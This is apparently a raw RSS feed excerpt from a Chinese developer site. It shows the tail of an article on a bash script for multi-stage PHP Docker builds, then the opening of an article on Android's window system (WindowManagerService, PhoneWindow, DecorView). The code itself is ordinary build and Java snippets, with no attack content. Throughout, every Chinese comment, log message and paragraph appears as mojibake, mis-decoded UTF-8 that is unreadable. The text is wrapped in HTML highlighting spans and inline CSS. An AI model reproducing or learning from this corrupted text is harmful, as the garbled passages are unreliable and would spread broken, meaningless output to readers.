        --build-arg LOCAL_EXTENSIONS=<span class="hljs-string">"<span class="hljs-variable">$local_extensions_arg</span>"</span> \
        --build-arg PHP_INI_CONFIGS=<span class="hljs-string">"<span class="hljs-variable">$php_ini_arg</span>"</span> \
        --build-arg COMPOSER_MIRROR=<span class="hljs-string">"<span class="hljs-variable">$COMPOSER_MIRROR</span>"</span> \
        --build-arg BUILD_MODE=<span class="hljs-string">"<span class="hljs-variable">$BUILD_MODE</span>"</span> \
        --tag <span class="hljs-string">"<span class="hljs-variable">$final_image_name</span>"</span> \
        --progress=plain \
        .
    
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        log_success <span class="hljs-string">"æœ€ç»ˆé•œåƒæ„å»ºæˆåŠŸ: <span class="hljs-variable">$final_image_name</span>"</span>
        log_info <span class="hljs-string">"é•œåƒä¿¡æ¯:"</span>
        docker images | grep <span class="hljs-string">"<span class="hljs-variable">$final_image_name</span>"</span>
    <span class="hljs-keyword">else</span>
        log_error <span class="hljs-string">"æœ€ç»ˆé•œåƒæ„å»ºå¤±è´¥"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># ä¸»å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
    log_info <span class="hljs-string">"=========================================="</span>
    log_info <span class="hljs-string">"PHP Docker å¤šé˜¶æ®µæ„å»ºå¼€å§‹"</span>
    log_info <span class="hljs-string">"=========================================="</span>
    
    <span class="hljs-comment"># åˆå§‹åŒ–å˜é‡</span>
    BASE_IMAGE=<span class="hljs-string">""</span>
    PECL_EXTENSIONS=()
    LOCAL_EXTENSIONS=()
    BUILD_MODE=<span class="hljs-string">"dev"</span>
    CUSTOM_SOURCE=<span class="hljs-string">"false"</span>
    COMPOSER_MIRROR=<span class="hljs-string">"auto"</span>
    PHP_INI_CONFIGS=()
    BUILD_TARGET=<span class="hljs-string">"all"</span>
    FORCE_REBUILD_BASE=<span class="hljs-string">"false"</span>
    SYSTEM_TYPE=<span class="hljs-string">""</span>
    BASE_IMAGE_NAME=<span class="hljs-string">""</span>
    
    <span class="hljs-comment"># æ£€æŸ¥é…ç½®æ–‡ä»¶</span>
    check_config_file
    
    <span class="hljs-comment"># è§£æé…ç½®</span>
    log_info <span class="hljs-string">"å¼€å§‹è§£æé…ç½®æ–‡ä»¶..."</span>
    parse_config
    
    <span class="hljs-comment"># æ£€æµ‹ç³»ç»Ÿç±»å‹</span>
    detect_system_type
    
    <span class="hljs-comment"># ç”ŸæˆåŸºç¡€é•œåƒåç§°</span>
    generate_base_image_name
    
    <span class="hljs-comment"># æ˜¾ç¤ºé…ç½®ä¿¡æ¯</span>
    log_info <span class="hljs-string">"=========================================="</span>
    log_info <span class="hljs-string">"é…ç½®ä¿¡æ¯:"</span>
    log_info <span class="hljs-string">"  åŸºç¡€é•œåƒ: <span class="hljs-variable">$BASE_IMAGE</span>"</span>
    log_info <span class="hljs-string">"  ç³»ç»Ÿç±»å‹: <span class="hljs-variable">$SYSTEM_TYPE</span>"</span>
    log_info <span class="hljs-string">"  åŸºç¡€é•œåƒåç§°: <span class="hljs-variable">$BASE_IMAGE_NAME</span>"</span>
    log_info <span class="hljs-string">"  PECL æ‰©å±•: <span class="hljs-variable">${PECL_EXTENSIONS[*]}</span>"</span>
    log_info <span class="hljs-string">"  LOCAL æ‰©å±•: <span class="hljs-variable">${LOCAL_EXTENSIONS[*]}</span>"</span>
    log_info <span class="hljs-string">"  æ„å»ºæ¨¡å¼: <span class="hljs-variable">$BUILD_MODE</span>"</span>
    log_info <span class="hljs-string">"  è‡ªå®šä¹‰æº: <span class="hljs-variable">$CUSTOM_SOURCE</span>"</span>
    log_info <span class="hljs-string">"  Composer é•œåƒ: <span class="hljs-variable">$COMPOSER_MIRROR</span>"</span>
    log_info <span class="hljs-string">"  æ„å»ºç›®æ ‡: <span class="hljs-variable">$BUILD_TARGET</span>"</span>
    log_info <span class="hljs-string">"  å¼ºåˆ¶é‡å»ºåŸºç¡€é•œåƒ: <span class="hljs-variable">$FORCE_REBUILD_BASE</span>"</span>
    log_info <span class="hljs-string">"=========================================="</span>
    
    <span class="hljs-comment"># æ ¹æ®æ„å»ºç›®æ ‡æ‰§è¡Œ</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$BUILD_TARGET</span>"</span> <span class="hljs-keyword">in</span>
        base)
            log_info <span class="hljs-string">"æ„å»ºç›®æ ‡: ä»…æ„å»ºåŸºç¡€é•œåƒ"</span>
            build_base_image
            ;;
        final)
            log_info <span class="hljs-string">"æ„å»ºç›®æ ‡: ä»…æ„å»ºæœ€ç»ˆé•œåƒ"</span>
            <span class="hljs-keyword">if</span> ! check_base_image_exists; <span class="hljs-keyword">then</span>
                log_error <span class="hljs-string">"åŸºç¡€é•œåƒä¸å­˜åœ¨ï¼Œè¯·å…ˆæ„å»ºåŸºç¡€é•œåƒ"</span>
                <span class="hljs-built_in">exit</span> 1
            <span class="hljs-keyword">fi</span>
            build_final_image <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
            ;;
        all)
            log_info <span class="hljs-string">"æ„å»ºç›®æ ‡: æ„å»ºåŸºç¡€é•œåƒå’Œæœ€ç»ˆé•œåƒ"</span>
            <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦éœ€è¦æ„å»ºåŸºç¡€é•œåƒ</span>
            <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$FORCE_REBUILD_BASE</span>"</span> = <span class="hljs-string">"true"</span> ]; <span class="hljs-keyword">then</span>
                log_warn <span class="hljs-string">"å¼ºåˆ¶é‡æ–°æ„å»ºåŸºç¡€é•œåƒ"</span>
                build_base_image
            <span class="hljs-keyword">else</span>
                <span class="hljs-keyword">if</span> check_base_image_exists; <span class="hljs-keyword">then</span>
                    log_info <span class="hljs-string">"åŸºç¡€é•œåƒå·²å­˜åœ¨ï¼Œè·³è¿‡æ„å»º"</span>
                <span class="hljs-keyword">else</span>
                    build_base_image
                <span class="hljs-keyword">fi</span>
            <span class="hljs-keyword">fi</span>
            build_final_image <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
            ;;
        *)
            log_error <span class="hljs-string">"æ— æ•ˆçš„æ„å»ºç›®æ ‡: <span class="hljs-variable">$BUILD_TARGET</span>"</span>
            <span class="hljs-built_in">exit</span> 1
            ;;
    <span class="hljs-keyword">esac</span>
    
    log_success <span class="hljs-string">"=========================================="</span>
    log_success <span class="hljs-string">"æ„å»ºæµç¨‹å®Œæˆï¼"</span>
    log_success <span class="hljs-string">"=========================================="</span>
}

<span class="hljs-comment"># æ‰§è¡Œä¸»å‡½æ•°</span>
main <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
</code></pre>
<ul>
<li>è¯¥æ–‡ä»¶æ˜¯è§£æé…ç½®æ–‡ä»¶åŠæ§åˆ¶æ„å»ºæƒ…å†µçš„æ–‡ä»¶</li>
</ul>
<h4 data-id="heading-19">æ‰§è¡Œæ„å»º</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">è¿›å…¥é¡¹ç›®ç›®å½•</span>
cd project
<span class="hljs-meta prompt_">
# </span><span class="bash">æ·»åŠ æ–‡ä»¶æ‰§è¡Œæƒé™</span>
chmod +x ./build.sh
<span class="hljs-meta prompt_">
# </span><span class="bash">æ‰§è¡Œæ„å»º</span>
./build.sh æ–°çš„é•œåƒåç§°
</code></pre>
<h4 data-id="heading-20">ç»“è¯­</h4>
<p>è¯¥ä»½å¥—é¤å¯ä»¥åšåˆ°ï¼š</p>
<ul>
<li>æ„å»ºé€»è¾‘é€šç”¨ï¼šä¸åŒç‰ˆæœ¬ã€ä¸åŒæ‰©å±•çš„æ„å»ºåªéœ€è¦ä¿®æ”¹ build.conf é…ç½®æ–‡ä»¶</li>
<li>æ‰©å±•è‡ªç”±åº¦é«˜ï¼šå¯è‡ªç”±å¢å‡æ‰©å±•ä¿¡æ¯ï¼Œå¯æŒ‡å®šç‰ˆæœ¬ï¼Œä¹Ÿå¯ä¸æŒ‡å®šï¼Œä¸æŒ‡å®šæ—¶å®‰è£…æœ€æ–°ç‰ˆæœ¬</li>
<li>æ„å»ºæ¨¡å¼åˆ‡æ¢ï¼šåˆ†ä¸º prod/devï¼Œprod æ„å»ºä¼šæ¸…æ¥šæ„å»ºç¼“å­˜ç­‰ä¿¡æ¯ï¼Œå‡å°‘é•œåƒä½“ç§¯ï¼›devæ¨¡å¼ä¸ä¼šï¼Œæ–¹ä¾¿å¤šæ¬¡æ„å»ºï¼Œå‡å°‘æ„å»ºæ—¶é—´</li>
<li>è‡ªå®šä¹‰ç³»ç»Ÿä¾èµ–æºï¼šè‡ªç”±é…ç½®æ˜¯å¦ä½¿ç”¨è‡ªå®šä¹‰ç³»ç»Ÿä¾èµ–æºï¼Œå‡å°‘æ„å»ºæˆåŠŸç‡å’Œæ„å»ºé€Ÿåº¦</li>
<li>è‡ªå®šä¹‰phpé…ç½®ï¼šä¸åŒçš„å¼€å‘éœ€æ±‚ï¼Œå¯èƒ½éœ€è¦ä¸é€šè¿‡çš„phpé…ç½®ï¼Œå¯ä»¥è‡ªç”±é…ç½®ï¼Œæ„å»ºåè¦†ç›–åŸæœ‰çš„é»˜è®¤é…ç½®</li>
<li>æ„å»ºç›®æ ‡è‡ªç”±ï¼šå¯è‡ªç”±é…ç½®æ„å»º åŸºç¡€é•œåƒ(base)ã€æœ€ç»ˆé•œåƒ(final)ã€åŸºç¡€+æœ€ç»ˆ(all)</li>
<li>ç³»ç»Ÿä¾èµ–è‡ªåŠ¨æ£€æµ‹ï¼šå¯æ ¹æ®é…ç½®çš„åŸºç¡€é•œåƒï¼Œè‡ªåŠ¨è¯†åˆ«é•œåƒç³»ç»Ÿï¼ˆdebian/alpineï¼‰ã€å¹¶å®‰è£…å¯¹åº”çš„ä¾èµ–ï¼Œå¦‚ï¼šç³»ç»Ÿä¾èµ–ã€ç³»ç»Ÿå·¥å…·ç­‰</li>
<li>GD æ‰©å±•è‡ªåŠ¨é…ç½®ï¼šå¦‚æœ local æ‰©å±•ä¸­å­˜åœ¨ GD æ‰©å±•ï¼Œåˆ™è‡ªåŠ¨åšæ‰©å±•ç‰¹æ®Šé…ç½®</li>
<li>é•œåƒåç§°è‡ªå®šä¹‰ï¼šåŸºç¡€é•œåƒåç§°è‡ªåŠ¨ç”Ÿæˆï¼Œæœ€ç»ˆé•œåƒåç§°å¯ä»¥è‡ªç”±å®šä¹‰</li>
<li>æ‰©å±•å®‰è£…é‡è¯•æœºåˆ¶ï¼šå®‰è£…æ‰©å±•å®¹æ˜“å› ä¸ºå„ç§åŸå› å¤±è´¥ï¼Œè¿½åŠ é‡è¯•æœºåˆ¶ï¼ˆ3æ¬¡ï¼‰å‡å°‘å¤±è´¥æ¬¡æ•°</li>
</ul>
<p>okkï¼Œæå‡åˆ°æ­¤ç»“æŸï¼Œåˆå¯ä»¥æ„‰å¿«çš„åšç‰›é©¬äº† ... ... ...</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥Androidç³»ç»Ÿï¼ˆåä¸‰ï¼‰Androidçš„çª—å£ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7575106644499578914</link>    <guid>https://juejin.cn/post/7575106644499578914</guid>    <pubDate>2025-11-23T13:16:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644499578914" data-draft-id="7575363120798466048" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥Androidç³»ç»Ÿï¼ˆåä¸‰ï¼‰Androidçš„çª—å£ç³»ç»Ÿ"/> <meta itemprop="keywords" content="Android,æºç ,è®¾è®¡æ¨¡å¼"/> <meta itemprop="datePublished" content="2025-11-23T13:16:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="apigfly"/> <meta itemprop="url" content="https://juejin.cn/user/2488950054453613"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥Androidç³»ç»Ÿï¼ˆåä¸‰ï¼‰Androidçš„çª—å£ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2488950054453613/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    apigfly
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T13:16:04.000Z" title="Sun Nov 23 2025 13:16:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>Android</code>çš„çª—å£ç³»ç»Ÿç”±<code>WindowManagerService</code>ç®¡ç†ï¼ŒåŒ…æ‹¬å¢åŠ å’Œåˆ é™¤çª—å£ï¼Œç¡®å®šçª—å£çš„å¤§å°å’Œä½ç½®ï¼Œä»¥åŠå®ç°çª—å£åˆ‡æ¢ã€çª—å£åŠ¨ç”»ç­‰åŠŸèƒ½ã€‚<code>WindowManagerService</code>åå­—è¾ƒé•¿ï¼Œåé¢ç®€ç§°<code>WMS</code></p>
<h2 data-id="heading-0">å‰è¨€</h2>
<blockquote>
<p>ä¸€ä¸ªå°é—®é¢˜</p>
</blockquote>
<p>åœ¨ Android ä¸­<code>Activity</code>å¯ä»¥ç†è§£æˆ Android ä¸­çš„ä¸€ä¸ªé¡µé¢ï¼Œå‰é¢çš„ç« èŠ‚æˆ‘ä»¬è¯´ <code>SurfaceFlinger</code> æœ€åä¼šæŠŠ <code>Surface</code> å¯¹åº”çš„ <code>Layer</code> åˆæˆåˆ°å±å¹•ä¸Šã€‚é‚£ä¹ˆ<strong>Activity å’Œ Surface çš„å…³ç³»åˆæ˜¯æ€ä¹ˆå…³è”çš„å‘¢ï¼Ÿ</strong></p>
<p>è®©æˆ‘ä»¬ä¸€èµ·æ’æŸ¥ä¸‹ï½ï½ï½</p>
<h2 data-id="heading-1">åº”ç”¨è¿›ç¨‹å’Œ<code>WMS</code>çš„è”ç³»</h2>
<p>åœ¨å­¦ä¹ <code>WMS</code>ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸‹åº”ç”¨å’Œ<code>WMS</code>ä¹‹é—´çš„è”ç³»ã€‚å¯¹äºåº”ç”¨æ¥è¯´ï¼š</p>
<ul>
<li>
<p><code>Activity</code></p>
<ul>
<li><code>Activity</code>å¹¶ä¸è´Ÿè´£è§†å›¾æ§åˆ¶ï¼Œå®ƒåªæ˜¯æ§åˆ¶ç”Ÿå‘½å‘¨æœŸå’Œå¤„ç†äº‹ä»¶</li>
<li>çœŸæ­£æ§åˆ¶è§†å›¾çš„æ˜¯<code>Window</code>ã€‚ä¸€ä¸ª<code>Activity</code>åŒ…å«äº†ä¸€ä¸ª<code>Window</code>ï¼Œ<code>Window</code>æ‰æ˜¯çœŸæ­£ä»£è¡¨ä¸€ä¸ªçª—å£</li>
<li><code>Activity</code>å°±åƒä¸€ä¸ªæ§åˆ¶å™¨ï¼Œç»Ÿç­¹è§†å›¾çš„æ·»åŠ ä¸æ˜¾ç¤ºï¼Œä»¥åŠé€šè¿‡å…¶ä»–å›è°ƒæ–¹æ³•ï¼Œæ¥ä¸<code>Window</code>ã€ä»¥åŠ<code>View</code>è¿›è¡Œäº¤äº’</li>
</ul>
</li>
<li>
<p><code>Window</code></p>
<ul>
<li><code>Window</code>æ˜¯è§†å›¾çš„æ‰¿è½½å™¨ï¼Œå†…éƒ¨æŒæœ‰ä¸€ä¸ª<code>DecorView</code>ï¼Œè€Œè¿™ä¸ª<code>DecorView</code>æ‰æ˜¯<code>view</code>çš„æ ¹å¸ƒå±€</li>
<li><code>Window</code>æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®é™…åœ¨<code>Activity</code>ä¸­æŒæœ‰çš„æ˜¯å…¶å­ç±»<code>PhoneWindow</code></li>
<li><code>PhoneWindow</code>ä¸­æœ‰ä¸ªå†…éƒ¨ç±»<code>DecorView</code>ï¼Œé€šè¿‡åˆ›å»º<code>DecorView</code>æ¥åŠ è½½<code>Activity</code>ä¸­``ä¼ é€’çš„å¸ƒå±€</li>
<li><code>Window</code>é€šè¿‡<code>WindowManager</code>å°†<code>DecorView</code>åŠ è½½å…¶ä¸­ï¼Œå¹¶å°†<code>DecorView</code>äº¤ç»™<code>ViewRoot</code>ï¼Œè¿›è¡Œè§†å›¾ç»˜åˆ¶ä»¥åŠå…¶ä»–äº¤äº’</li>
</ul>
</li>
<li>
<p><code>ViewRoot</code></p>
<ul>
<li>æ‰€æœ‰<code>View</code>çš„ç»˜åˆ¶ä»¥åŠäº‹ä»¶åˆ†å‘ç­‰äº¤äº’éƒ½æ˜¯é€šè¿‡å®ƒæ¥æ‰§è¡Œæˆ–ä¼ é€’çš„</li>
<li><code>ViewRoot</code>å¯¹åº”çš„å®ç°ç±»æ˜¯<code>ViewRootImpl</code>ç±»ï¼Œå®ƒæ˜¯è¿æ¥<code>WindowManagerService</code>å’Œ<code>DecorView</code>çš„çº½å¸¦</li>
<li><code>View</code>çš„ä¸‰å¤§æµç¨‹ï¼šæµ‹é‡(measure)ã€å¸ƒå±€(layout)ã€ç»˜åˆ¶ (draw))å‡é€šè¿‡<code>ViewRoot</code>æ¥å®Œæˆ</li>
</ul>
</li>
</ul>
<p>é™¤äº†ä¸Šé¢è¿™ä¸‰éƒ¨åˆ†ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯åœ¨<code>Android</code>åº”ç”¨ä¸­å­˜åœ¨çš„ä¸€ä¸ªå”¯ä¸€çš„<code>WindowManagerGlobal</code>å¯¹è±¡ï¼Œå®ƒä»¬çš„ç±»å›¾å…³ç³»å¦‚ä¸‹ï¼š<br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3f91ffc402e497986337eba12df2b94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXBpZ2ZseQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764508564&amp;x-signature=vkLls2NZ4xOy1Jgqwi5BfD6K2Os%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-2">åº”ç”¨ä¸­çš„Windowå¯¹è±¡</h3>
<p>åº”ç”¨ä¸­çš„æ¯ä¸ª<code>Activity</code>å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªç±»å‹ä¸º<code>Window</code>çš„æˆå‘˜å˜é‡<code>mWindow</code>ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Activity</span> {
    ...
    <span class="hljs-keyword">private</span> Window mWindow;
    ...
}
</code></pre>
<p><code>Window</code>å¯¹è±¡åœ¨åº”ç”¨è¿›ç¨‹ä»£è¡¨äº†ä¸€ä¸ªçª—å£ï¼Œè¿™æ˜¯ä¸€å—çŸ©å½¢çš„å›¾åƒç»˜åˆ¶åŒºåŸŸã€‚</p>
<p>ä»<code>WMS</code>çš„è§’åº¦æ¥è¯´ï¼Œå®ƒå¹¶ä¸å…³ç³»åº”ç”¨ä¸­çš„å„ç§<code>View</code>ï¼Œä»–ç®¡ç†å’Œè°ƒåº¦çš„å¯¹è±¡æ˜¯<code>Window</code>ã€‚<code>Activity</code>ä¸­çš„<code>View</code>æ ‘ä¸ç®¡å¤šå¤æ‚ï¼Œæœ€åè¾“å‡ºçš„ä¹Ÿä»…ä»…æ˜¯ä¸€å¼ å„ä¸ª<code>View</code>åˆæˆçš„å›¾åƒè€Œå·²ã€‚</p>
<p><code>Window</code>æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œåœ¨<code>Activity</code>ç±»çš„<code>attach()</code>æ–¹æ³•ä¸­ä¼šå¯¹æˆå‘˜å˜é‡<code>mWindow</code>è¿›è¡Œåˆå§‹åŒ–ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attach</span><span class="hljs-params">(...)</span> {
        ...
        mWindow = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhoneWindow</span>(<span class="hljs-built_in">this</span>, window, activityConfigCallback);
        ...
    }
</code></pre>
<p><code>attach()</code>æ–¹æ³•ä¸­<code>mWindow</code>å®ä¾‹åŒ–æˆäº†ä¸€ä¸ª<code>PhoneWindow</code>å¯¹è±¡ã€‚</p>
<p>è€Œå¯¹äº<code>PhoneWindow</code>å¯¹è±¡ï¼Œéœ€è¦æˆ‘ä»¬å…³æ³¨çš„éƒ¨åˆ†æ˜¯å¦‚ä¸‹ä¸¤ä¸ªæˆå‘˜å˜é‡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PhoneWindow</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Window</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MenuBuilder</span>.Callback {
    <span class="hljs-comment">// This is the top-level view of the window, containing the window decor.</span>
    <span class="hljs-keyword">private</span> DecorView mDecor;
    <span class="hljs-comment">// This is the view in which the window contents are placed. It is either</span>
    <span class="hljs-comment">// mDecor itself, or a child of mDecor where the contents go.</span>
    ViewGroup mContentParent;
    ...
}
</code></pre>
<ul>
<li>
<p><code>mDecor</code>çš„ç±»å‹æ˜¯<code>DecorView</code>ï¼Œå®ƒæ˜¯<code>FrameLayout</code>çš„å­ç±»ï¼Œå®ƒå¯ä»¥è¢«è®¤ä¸ºæ˜¯<code>Android</code>è§†å›¾æ ‘çš„æ ¹èŠ‚ç‚¹è§†å›¾ã€‚</p>
<ul>
<li><code>DecorView</code>ä½œä¸ºé¡¶çº§<code>View</code>ï¼Œå®ƒåŠ è½½çš„èµ„æºæ–‡ä»¶å†…éƒ¨ä¼šåŒ…å«ä¸€ä¸ª<code>android:id="@android:id/content"</code>çš„<code>ViewGroup</code></li>
<li>è¿™ä¸ª<code>ViewGroup</code>ä¾¿æ˜¯åé¢ç”¨æ¥æ·»åŠ <code>setContentView()</code>æ–¹æ³•ä¼ å…¥çš„<code>layout</code>å¸ƒå±€æ–‡ä»¶</li>
<li><code>DecorView</code>å…·ä½“åŠ è½½å“ªç§å¸ƒå±€æ–‡ä»¶å’Œä¸»é¢˜æœ‰å…³ï¼Œè¿™éƒ¨åˆ†åœ¨<code>PhoneWindow</code>çš„<code>generateLayout()</code>æ–¹æ³•ä¸­ä½“ç°</li>
</ul>
</li>
<li>
<p><code>mContentParent</code>çš„ç±»å‹æ˜¯<code>ViewGroup</code>ï¼Œå®ƒå…¶å®å°±æ˜¯<code>android:id="@android:id/content"</code>å¯¹åº”çš„ç»„ä»¶</p>
<ul>
<li>è·Ÿè¸ª<code>generateLayout()</code>æ–¹æ³•å°±ä¼šå‘ç°å¦‚ä¸‹ä»£ç ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-type">ViewGroup</span> <span class="hljs-variable">contentParent</span> <span class="hljs-operator">=</span> (ViewGroup)findViewById(ID_ANDROID_CONTENT);
</code></pre>
<ul>
<li><code>contentParent</code>åˆ›å»ºå®Œæˆåä¾¿ä¼šèµ‹å€¼ç»™<code>mContentParent</code>ï¼Œè€Œæ­¤å¤„çš„<code>ID_ANDROID_CONTENT</code>çš„å®šä¹‰æ˜¯åœ¨<code>Window.java</code>ä¸­</li>
</ul>
